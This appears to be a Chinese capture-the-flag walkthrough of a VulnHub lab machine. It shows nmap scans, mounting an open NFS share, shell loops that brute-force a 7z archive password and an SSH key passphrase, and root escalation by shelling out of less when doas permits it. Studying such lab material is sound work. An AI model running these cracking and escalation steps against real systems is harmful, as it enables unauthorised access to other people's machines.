该项目是[Fred Wemeijer ~ VulnHub](https://www.vulnhub.com/author/fred-wemeijer,595/)作者精心制作的项目环境，目标是获取获得root权限并找到flag.txt文本信息 Task is to become root
and read /root/flag.txt.

本项目有始有终会用到信息收集->NFS挂载>rsa爆破->内网信息枚举->提权，最终拿到flag.txt的过程，那么在这当中用到了一些小技巧都会在文章中演示出来，希望大家能动手也来和我一起学习渗透。

 **请注意：**

> 本文仅用于技术讨论与研究，对于所有笔记中复现的这些终端或者服务器，都是自行搭建的环境进行渗透的。我将使用Kali
> Linux作为此次学习的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，本站及作者概不负责。

![1](https://image.3001.net/images/20221017/1666016262_634d6406611e23e322774.png!small)

可以看到IP地址为192.168.27.132

## 1\. nmap全端口信息扫描

    
    
    nmap -p- 192.168.27.132 -A

扫描目标地址所在C段（同一网段）的在线情况 Nmap -sP 192.168.27.0/24

目标地址的操作系统指纹识别 Nmap -O 192.168.128.130

目标地址提供服务的版本检测 Nmap -sV 192.168.128.130

探测防火墙状态 Nmap -sF -T4 192.168.128.130

 **nmap -sL** 把扫描的目标地址列出来 **nmap -sn**
不做端口扫描(经常判断有无ip存活，类似ping一下(目标主机屏蔽了ping请求可用))

 **nmap -v** 获取详细信息

 **nmap -Pn** 过滤没有返回信息的主机地址，一般来说防火墙会配置一些策略，为了防止漏掉的主机，一般会加这个参数

nmap -n 不做DNS的解析

 **nmap -sA** 检测目标主机哪些端口被防火墙屏蔽

![2](https://image.3001.net/images/20221017/1666016262_634d6406d396da54ad4c4.png!small)

22/tcp open ssh OpenSSH 7.9 (protocol 2.0)

| ssh-hostkey:

| 2048 ef:3b:2e:cf:40:19:9e:bb:23:1e:aa:24:a1:09:4e:d1 (RSA)

| 256 c8:5c:8b:0b:e1:64:0c:75:c3:63:d7:b3:80:c9:2f:d2 (ECDSA)

|_ 256 61:bc:45:9a:ba:a5:47:20:60:13:25:19:b0:47:cb:ad (ED25519)

111/tcp open rpcbind 2 (RPC #100000)

| rpcinfo:

| program version port/proto service

| 100000 2 111/tcp rpcbind

| 100000 2 111/udp rpcbind

| 100003 2,3 2049/tcp nfs

| 100003 2,3 2049/udp nfs

| 100005 1,3 880/udp mountd

|_ 100005 1,3 1013/tcp mountd

1013/tcp open mountd 1-3 (RPC #100005)

2049/tcp open nfs 2-3 (RPC #100003)

nfs端口号2049

rpc端口号111

NFS 是一种基于 TCP/IP 传输的网络文件系统协议，最初由 sun 公司开发。通过使用 NFS协议，客户机可以像访问本地目录一样访问远程 NFS
服务器中的共享资源。NFS 也是
NAS存储设备必然支持的一种协议，但是因为没有用户认证机制，而且数据在网络上明文传输，安全性很差，所以一般只能在局域网中使用。

在Centos 7系统中，需要安装 nfs-utils、rpcbind 软件包来提供 NFS 共享服务，前者用于 NFS 共享发布和访问，后者用于 RPC
支持。

<https://blog.csdn.net/qq_45547688/article/details/124559328>

## 2\. 挂载NFS

使用 showmount 命令检查 NFS 共享分区

    
    
    showmount -e 192.168.27.132

![3](https://image.3001.net/images/20221017/1666016263_634d640771b5bc902aa07.png!small)

在当前路径下新建一个文件夹，并且挂载nfs 这里文件夹名字可以随便起

    
    
    mkdir ylion  
    mount -t nfs 192.168.27.132:/home/user/storage ylion

![4](https://image.3001.net/images/20221017/1666016263_634d6407ef047b849fca2.png!small)

![5](https://image.3001.net/images/20221017/1666016264_634d64086be92757e32b1.png!small)

## 3\. 爆破7z

尝试解压这个压缩包，发现存在密码

7z破解脚本：

<https://raw.githubusercontent.com/exexute/PythonScaffold/PythonScaffold_0.1/enum_violence/file_enum/7z-crack.sh>

其命令内容为：

    
    
    cat $2 | while read line;do if 7z e $1 -p"$line" 1>/dev/null 2>/dev/null;then echo "FOUND PASSWORD:"$line;break;fi;done

使用7z命令进行字典爆破

    
    
    ./1.sh backup.7z rockyou.txt

![6](https://image.3001.net/images/20221017/1666016264_634d6408dc4e0e1ae29d0.png!small)

发现id_rsa和id_rsa.pub

使用命令查看密钥中的所有信息

    
    
    ssh-keygen -l -f id_rsa.pub

![7](https://image.3001.net/images/20221017/1666016265_634d640992e8590ff4f3e.png!small)

## 4\. rsa爆破

因为存在公钥和密钥，所以无法使用九头蛇等工具进行爆破

使用一个命令采用循环的方式进行爆破

cat /usr/share/wordlists/metasploit/adobe_top100_pass.txt | while read line;do
if ssh-keygen -p -P $line -N $line -f id_rsa 1>/dev/null 2>/dev/null;then echo
"PASSWORD FOUND : "$line;break;fi;done;

![8](https://image.3001.net/images/20221017/1666016266_634d640a0d74c765f70e5.png!small)

密码为12345678

赋权连接

    
    
    chmod 600 id_rsa  
    ssh -i id_rsa user@192.168.27.132

![9](https://image.3001.net/images/20221017/1666016266_634d640a8947458496511.png!small)

7z的秘钥爆破：

cat /root/Desktop/rockyou.txt|while read line; do 7z e backup.7z -p"$line"
-oout; if grep -iRl SSH; then echo $line; break;fi;done

id_rsa秘钥爆破：

cat /root/Desktop/rockyou.txt|while read line; do if ssh-keygen -p -P "$line"
-N password -f id_rsa; then echo $line; break;fi;done

## 5\. 内网信息枚举/提权

    
    
    find / -perm -4000 2>/dev/null

通过find命令我们找到了suid权限运行的程序/usr/bin/doas，它是sudo命令的替代。doas是BSD系列系统下的权限管理工具，类似于Debian系列下的sudo命令

在阅读“doas.conf”文件后，我们发现“less”可以以root身份运行。

查看/etc目录，有doas.conf

![10](https://image.3001.net/images/20221017/1666016267_634d640b0c4a1691cc356.png!small)

查看内容

![20221017215809.png](https://image.3001.net/images/20221017/1666016267_634d640b7febb1773b1ef.png!small)

Permit/Deny：允许规则

Nopass：用户不需要输入任何密码

Persist：用户认证成功后，一段时间内不要再次询问密码

Keepenv：维护用户的环境

Cmd：命令被允许运行

这里说doas配置文件阐述less可以在没有密码的情况下像root一样在没有密码的情况下运行！

![12](https://image.3001.net/images/20221017/1666016267_634d640be94623f02e59a.png!small)

首先用doas /usr/bin/less
/var/log/authlog查看日志文件，然后直接按v，可进入编辑模式，但是会提示只读，进入编辑模式后，可以通过vi编辑器操作方式，执行系统命令，即:!/bin/sh，此时便会提升到root权限！！

通过以上的学习，我们认知了一些红队的小技巧的技术手段，完成了从信息收集到提权项目落地，学习到了非常多的技巧，例如nmap全端口信息枚举、NFS挂载、rsa爆破、提权等等，希望伙伴们能实际操作复现一遍，不要眼高手低！巩固自身的渗透技术和技巧！

最后

希望大家提高安全意识，没有网络安全就没有国家安全！

